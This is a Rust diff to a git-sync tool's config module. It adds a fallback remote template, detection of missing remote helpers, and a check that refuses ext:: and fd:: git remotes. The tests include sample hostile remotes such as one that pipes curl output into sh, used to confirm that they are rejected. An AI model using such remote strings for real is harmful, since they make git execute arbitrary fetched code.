@@ -9,9 +9,15 @@
 //! # beastly clones over https with its credential helper; grouchly over its ssh alias.
 //! remote_template = "git@github-estejosh:estejosh/{project}.git"
 //!
+//! # Tried after `remote_template` when that one cannot be used (its remote helper is not
+//! # installed) or does not answer, before the origin of any checkout already here.
+//! fallback_template = "https://github.com/estejosh/{project}.git"
+//!
 //! [git.remotes]
 //! # A project whose remote is not the template's.
 //! odd-one = "https://example.com/odd/one.git"
+//! # SovGit: git speaks `sov://` through the `git-remote-sov` helper, which must be on PATH.
+//! sovproject = "sov://my-bucket/sovproject"
 //!
 //! [swarm]
 //! # Never cloned, served or enrolled on this machine, whatever the channel says.
@@ -44,6 +50,9 @@ pub const FILE: &str = "ferry.toml";
 pub struct RootConfig {
     /// `[git] remote_template`, with `{project}` where the project's id goes.
     pub remote_template: Option<String>,
+    /// `[git] fallback_template`: tried after `remote_template` (a SovGit bucket, say, with
+    /// GitHub behind it), with `{project}` where the project's id goes.
+    pub fallback_template: Option<String>,
     /// `[git.remotes]`: a remote for one project, ahead of the template.
     pub remotes: BTreeMap<String, String>,
     /// `[swarm] exclude`: projects this machine keeps out of the swarm.
@@ -89,6 +98,19 @@ impl RootConfig {
                     Err(error) => config
                         .notes
                         .push(format!("[git] remote_template: {error:#}")),
+                }
+            }
+            if let Some(template) = git.get("fallback_template").and_then(toml::Value::as_str) {
+                match check_remote(template) {
+                    Ok(()) if template.contains("{project}") => {
+                        config.fallback_template = Some(template.to_owned());
+                    }
+                    Ok(()) => config
+                        .notes
+                        .push("[git] fallback_template needs {project} in it; ignored".into()),
+                    Err(error) => config
+                        .notes
+                        .push(format!("[git] fallback_template: {error:#}")),
                 }
             }
             if let Some(remotes) = git.get("remotes").and_then(toml::Value::as_table) {
@@ -164,7 +186,117 @@ pub fn check_remote(remote: &str) -> Result<()> {
     if remote.trim().is_empty() || remote.starts_with('-') || remote.contains(['\n', '\r', '\0']) {
         bail!("that is not a git remote");
     }
+    // `ext::<command>` and `fd::<n>` make git run a command or read a descriptor of the
+    // caller's choosing. Git refuses `ext` unless told otherwise; a remote that asks for it
+    // does not belong in a file that is copied between machines.
+    let lower = remote.trim_start().to_ascii_lowercase();
+    if lower.starts_with("ext::") || lower.starts_with("fd::") {
+        bail!("that is not a git remote Ferryman will clone from (ext:: and fd:: run commands)");
+    }
     Ok(())
+}
+
+/// Schemes git speaks itself. Any other `<scheme>://` (or `<scheme>::<address>`) is a remote
+/// helper: git runs a program called `git-remote-<scheme>` to talk to it.
+const BUILT_IN_SCHEMES: [&str; 8] = [
+    "http", "https", "ssh", "git", "file", "ssh+git", "git+ssh", "ftp",
+];
+
+/// The scheme of `remote` when git needs a `git-remote-<scheme>` helper for it (`sov` for
+/// `sov://bucket/repo`), or `None` for a remote git handles itself: https, ssh, git, a path,
+/// `user@host:path`.
+#[must_use]
+pub fn helper_scheme(remote: &str) -> Option<String> {
+    let remote = remote.trim();
+    let scheme = remote
+        .split_once("://")
+        .or_else(|| remote.split_once("::"))
+        .map(|(scheme, _)| scheme.to_ascii_lowercase())?;
+    let plain = !scheme.is_empty()
+        && scheme
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'));
+    (plain && !BUILT_IN_SCHEMES.contains(&scheme.as_str())).then_some(scheme)
+}
+
+/// The `git-remote-<scheme>` program in `folders`, if there is one. On Windows an executable
+/// extension is allowed; elsewhere the file must be executable.
+#[must_use]
+pub fn find_helper(scheme: &str, folders: &[PathBuf]) -> Option<PathBuf> {
+    if scheme.is_empty()
+        || !scheme
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "+-.".contains(c))
+    {
+        return None;
+    }
+    let name = format!("git-remote-{scheme}");
+    let extensions: &[&str] = if cfg!(windows) {
+        &["", ".exe", ".cmd", ".bat"]
+    } else {
+        &[""]
+    };
+    folders.iter().find_map(|folder| {
+        extensions.iter().find_map(|extension| {
+            let candidate = folder.join(format!("{name}{extension}"));
+            let meta = fs::metadata(&candidate).ok()?;
+            if !meta.is_file() {
+                return None;
+            }
+            #[cfg(unix)]
+            {
+                use std::os::unix::fs::PermissionsExt;
+                if meta.permissions().mode() & 0o111 == 0 {
+                    return None;
+                }
+            }
+            Some(candidate)
+        })
+    })
+}
+
+/// Where git looks for remote helpers: the folders of `PATH`, then git's own exec path.
+#[must_use]
+pub fn helper_folders() -> Vec<PathBuf> {
+    let mut folders: Vec<PathBuf> = std::env::var_os("PATH")
+        .map(|path| std::env::split_paths(&path).collect())
+        .unwrap_or_default();
+    let mut git = std::process::Command::new("git");
+    git.arg("--exec-path");
+    #[cfg(windows)]
+    {
+        use std::os::windows::process::CommandExt;
+        git.creation_flags(0x0800_0000);
+    }
+    if let Ok(output) = git.output()
+        && output.status.success()
+    {
+        let printed = String::from_utf8_lossy(&output.stdout).trim().to_owned();
+        if !printed.is_empty() {
+            folders.push(PathBuf::from(printed));
+        }
+    }
+    folders
+}
+
+/// Why git cannot clone from or fetch `remote` on this machine, or `None` when it can as far
+/// as its program is concerned: a `sov://` remote needs `git-remote-sov` on PATH, and without
+/// it git fails with "remote helper not found" after a long pause. Said up front instead.
+#[must_use]
+pub fn helper_missing(remote: &str) -> Option<String> {
+    helper_missing_in(remote, &helper_folders())
+}
+
+/// [`helper_missing`], with the folders to look in given.
+#[must_use]
+pub fn helper_missing_in(remote: &str, folders: &[PathBuf]) -> Option<String> {
+    let scheme = helper_scheme(remote)?;
+    find_helper(&scheme, folders).is_none().then(|| {
+        format!(
+            "{remote}: git needs the program git-remote-{scheme} for {scheme}:// remotes and it \
+             is not installed (not on PATH, not in git's exec path)"
+        )
+    })
 }
 
 /// `remote` with any user name or password taken out of an http(s) address, so what is
@@ -256,6 +388,19 @@ pub fn set_excluded(root: &Root, project: &str, excluded: bool) -> Result<bool> 
 /// # Errors
 /// The template has no `{project}` in it, carries a secret, or the file cannot be written.
 pub fn set_remote_template(root: &Root, template: &str) -> Result<bool> {
+    set_template(root, "remote_template", template)
+}
+
+/// Record the template tried after [`set_remote_template`]'s. Returns whether the file
+/// changed.
+///
+/// # Errors
+/// As for [`set_remote_template`].
+pub fn set_fallback_template(root: &Root, template: &str) -> Result<bool> {
+    set_template(root, "fallback_template", template)
+}
+
+fn set_template(root: &Root, key: &str, template: &str) -> Result<bool> {
     check_remote(template)?;
     if !template.contains("{project}") {
         bail!("a remote template needs {{project}} where the project's id goes");
@@ -267,13 +412,10 @@ pub fn set_remote_template(root: &Root, template: &str) -> Result<bool> {
     let Some(git) = git.as_table_mut() else {
         bail!("[git] in {FILE} is not a table; fix it by hand first");
     };
-    if git.get("remote_template").and_then(toml::Value::as_str) == Some(template) {
+    if git.get(key).and_then(toml::Value::as_str) == Some(template) {
         return Ok(false);
     }
-    git.insert(
-        "remote_template".into(),
-        toml::Value::String(template.to_owned()),
-    );
+    git.insert(key.into(), toml::Value::String(template.to_owned()));
     write(root, &table)?;
     Ok(true)
 }
@@ -339,6 +481,106 @@ mod tests {
         assert_eq!(config.notes.len(), 1, "{:?}", config.notes);
         assert!(set_remote_template(&root, "https://u:p@example.com/{project}.git").is_err());
         assert!(set_remote_template(&root, "https://example.com/fixed.git").is_err());
+    }
+
+    #[test]
+    fn a_remote_that_runs_a_command_is_refused() {
+        assert!(check_remote("ext::sh -c 'curl evil | sh'").is_err());
+        assert!(check_remote("EXT::sh -c id").is_err());
+        assert!(check_remote("fd::3").is_err());
+        assert!(check_remote("sov://bucket/repo").is_ok());
+    }
+
+    #[test]
+    fn a_sov_remote_needs_its_helper_and_nothing_else_does() {
+        assert_eq!(
+            helper_scheme("sov://my-bucket/quantly").as_deref(),
+            Some("sov")
+        );
+        assert_eq!(
+            helper_scheme("sov::my-bucket/quantly").as_deref(),
+            Some("sov")
+        );
+        for builtin in [
+            "https://github.com/estejosh/x.git",
+            "http://example.com/x.git",
+            "ssh://git@example.com/x.git",
+            "git@github-estejosh:estejosh/x.git",
+            "git://example.com/x.git",
+            "file:///srv/x.git",
+            "/srv/git/x.git",
+            r"X:\ferry\origins\x.git",
+            "X:/ferry/origins/x.git",
+        ] {
+            assert_eq!(helper_scheme(builtin), None, "{builtin}");
+        }
+    }
+
+    #[test]
+    fn a_missing_helper_is_said_before_git_is_asked() {
+        let dir = tempfile::tempdir().unwrap();
+        let folders = vec![dir.path().to_path_buf()];
+        let said = helper_missing_in("sovtest-absent://bucket/quantly", &folders)
+            .expect("no helper in the folder");
+        assert!(said.contains("git-remote-sovtest-absent"), "{said}");
+        assert!(said.contains("sovtest-absent://bucket/quantly"), "{said}");
+        // Remotes git speaks itself never need one.
+        assert_eq!(
+            helper_missing_in("https://example.com/x.git", &folders),
+            None
+        );
+
+        // A helper in a folder on the list is found; a folder or a non-executable file is not.
+        let name = if cfg!(windows) {
+            "git-remote-sovtest-here.cmd"
+        } else {
+            "git-remote-sovtest-here"
+        };
+        let helper = dir.path().join(name);
+        fs::write(&helper, "#!/bin/sh\nexit 0\n").unwrap();
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            fs::set_permissions(&helper, fs::Permissions::from_mode(0o644)).unwrap();
+            assert!(
+                helper_missing_in("sovtest-here://b/x", &folders).is_some(),
+                "a file that cannot be run is not a helper"
+            );
+            fs::set_permissions(&helper, fs::Permissions::from_mode(0o755)).unwrap();
+        }
+        assert_eq!(helper_missing_in("sovtest-here://b/x", &folders), None);
+        assert_eq!(find_helper("sovtest-here", &folders), Some(helper));
+        // A scheme cannot be used to name a file in some other folder.
+        assert_eq!(find_helper("../x", &folders), None);
+        let folder_named_like_one = dir.path().join("git-remote-sovtest-dir");
+        fs::create_dir_all(&folder_named_like_one).unwrap();
+        assert_eq!(find_helper("sovtest-dir", &folders), None);
+    }
+
+    #[test]
+    fn the_fallback_template_is_read_and_checked_like_the_first() {
+        let (_dir, root) = root();
+        fs::write(
+            path(&root),
+            "[git]\nremote_template = \"sov://bucket/{project}\"\n\
+             fallback_template = \"https://github.com/estejosh/{project}.git\"\n",
+        )
+        .unwrap();
+        let config = RootConfig::load(&root);
+        assert_eq!(
+            config.fallback_template.as_deref(),
+            Some("https://github.com/estejosh/{project}.git")
+        );
+        fs::write(
+            path(&root),
+            "[git]\nfallback_template = \"https://u:p@example.com/{project}.git\"\n",
+        )
+        .unwrap();
+        let config = RootConfig::load(&root);
+        assert_eq!(config.fallback_template, None);
+        assert_eq!(config.notes.len(), 1, "{:?}", config.notes);
+        assert!(set_fallback_template(&root, "https://u:p@example.com/{project}.git").is_err());
+        assert!(set_fallback_template(&root, "https://example.com/fixed.git").is_err());
     }
 
     #[test]
